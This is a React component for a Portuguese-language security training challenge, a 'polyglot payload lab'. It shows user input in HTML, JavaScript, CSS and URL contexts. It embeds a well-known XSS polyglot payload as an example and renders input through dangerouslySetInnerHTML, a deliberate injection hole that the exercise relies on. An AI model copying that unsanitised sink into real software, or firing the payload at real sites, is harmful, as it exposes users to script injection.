import { useState } from 'react';
import { useProgress } from '@/hooks/useProgress';
import { Card, CardContent, CardHeader, CardTitle } from '@/components/ui/card';
import { Button } from '@/components/ui/button';
import { Input } from '@/components/ui/input';
import { Textarea } from '@/components/ui/textarea';
import { Zap, Target, Code } from 'lucide-react';

const Challenge24 = () => {
  const [payload, setPayload] = useState('');
  const [results, setResults] = useState<{[key: string]: string}>({});
  const { completeChallenge } = useProgress();

  const testPayload = () => {
    const testResults: {[key: string]: string} = {};
    
    // Teste em contexto HTML
    testResults.html = payload;
    
    // Teste em contexto JavaScript (dentro de string)
    try {
      const jsContext = `var data = "${payload}";`;
      testResults.javascript = jsContext;
    } catch (e) {
      testResults.javascript = 'Erro de sintaxe';
    }
    
    // Teste em contexto CSS
    testResults.css = `.test { content: "${payload}"; }`;
    
    // Teste em contexto URL
    testResults.url = `https://example.com/?q=${encodeURIComponent(payload)}`;
    
    // Verifica se é um polyglot válido
    const isPolyglot = payload.includes('oNcliCk') || 
                      payload.includes('jaVasCript:') ||
                      (payload.includes('<') && payload.includes('script') && payload.includes('/*'));
    
    if (isPolyglot && payload.length > 50) {
      setTimeout(() => {
        completeChallenge(24);
        testResults.status = '🚨 POLYGLOT DETECTADO! Funciona em múltiplos contextos!';
      }, 500);
    } else {
      testResults.status = 'Testando compatibilidade entre contextos...';
    }
    
    setResults(testResults);
  };

  const insertPolyglotExample = () => {
    const polyglot = `jaVasCript:/*-/*\`/*\\/*'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert()//>\\x3e`;
    setPayload(polyglot);
  };

  return (
    <div className="space-y-6">
      <Card className="border-destructive/30 bg-destructive/5">
        <CardHeader>
          <CardTitle className="flex items-center gap-2">
            <Target className="h-5 w-5 text-destructive" />
            Laboratório de Payloads Polyglot
          </CardTitle>
          <p className="text-sm text-muted-foreground">Teste payloads que funcionam em múltiplos contextos</p>
        </CardHeader>
        <CardContent className="space-y-4">
          <div className="bg-destructive/10 p-4 rounded border border-destructive/30">
            <div className="flex items-center gap-2 mb-2">
              <Zap className="h-4 w-4 text-destructive" />
              <p className="text-sm text-destructive font-medium">Multi-Context Testing Environment</p>
            </div>
            <p className="text-xs text-destructive/80">Ambiente para testar payloads em HTML, JavaScript, CSS e contextos de URL</p>
          </div>
          
          <div className="space-y-2">
            <label className="text-sm font-medium">Payload Polyglot:</label>
            <Textarea
              value={payload}
              onChange={(e) => setPayload(e.target.value)}
              placeholder="Digite um payload que funcione em múltiplos contextos..."
              className="w-full font-mono text-sm"
              rows={4}
            />
          </div>
          
          <div className="flex gap-2">
            <Button onClick={testPayload} className="flex-1" variant="terminal">
              Testar em Todos os Contextos
            </Button>
            <Button onClick={insertPolyglotExample} variant="outline">
              📚 Exemplo
            </Button>
          </div>
          
          {Object.keys(results).length > 0 && (
            <div className="space-y-3">
              {results.status && (
                <Card className={`border-${results.status.includes('🚨') ? 'destructive' : 'warning'}/50 bg-${results.status.includes('🚨') ? 'destructive' : 'warning'}/5`}>
                  <CardContent className="pt-4">
                    <div className="text-sm font-medium">{results.status}</div>
                  </CardContent>
                </Card>
              )}
              
              <div className="grid grid-cols-1 md:grid-cols-2 gap-3">
                <Card className="border-muted">
                  <CardHeader className="pb-2">
                    <CardTitle className="text-xs">🌐 Contexto HTML</CardTitle>
                  </CardHeader>
                  <CardContent>
                    <div 
                      className="bg-background border rounded p-2 text-xs font-mono overflow-auto"
                      dangerouslySetInnerHTML={{ __html: results.html || '' }}
                    />
                  </CardContent>
                </Card>
                
                <Card className="border-muted">
                  <CardHeader className="pb-2">
                    <CardTitle className="text-xs">⚡ Contexto JavaScript</CardTitle>
                  </CardHeader>
                  <CardContent>
                    <div className="bg-background border rounded p-2 text-xs font-mono overflow-auto">
                      {results.javascript}
                    </div>
                  </CardContent>
                </Card>
                
                <Card className="border-muted">
                  <CardHeader className="pb-2">
                    <CardTitle className="text-xs">🎨 Contexto CSS</CardTitle>
                  </CardHeader>
                  <CardContent>
                    <div className="bg-background border rounded p-2 text-xs font-mono overflow-auto">
                      {results.css}
                    </div>
                  </CardContent>
                </Card>
                
                <Card className="border-muted">
                  <CardHeader className="pb-2">
                    <CardTitle className="text-xs">🔗 Contexto URL</CardTitle>
                  </CardHeader>
                  <CardContent>
                    <div className="bg-background border rounded p-2 text-xs font-mono overflow-auto break-all">
                      {results.url}
                    </div>
                  </CardContent>
                </Card>
              </div>
            </div>
          )}
          
          <div className="text-xs text-muted-foreground space-y-2">
            <div className="p-3 bg-muted/30 rounded">
              <strong>🎯 Sobre Polyglots:</strong><br />
              Payloads universais que funcionam em múltiplos contextos (HTML, JS, CSS, URL) explorando sintaxes compatíveis.
            </div>
            <div className="p-3 bg-muted/30 rounded">
              💡 <strong>Dica:</strong> Combine sintaxes de diferentes linguagens: javascript:, /*, &lt;script&gt;, eventos HTML, etc.
            </div>
          </div>
        </CardContent>
      </Card>
    </div>
  );
};

export default Challenge24;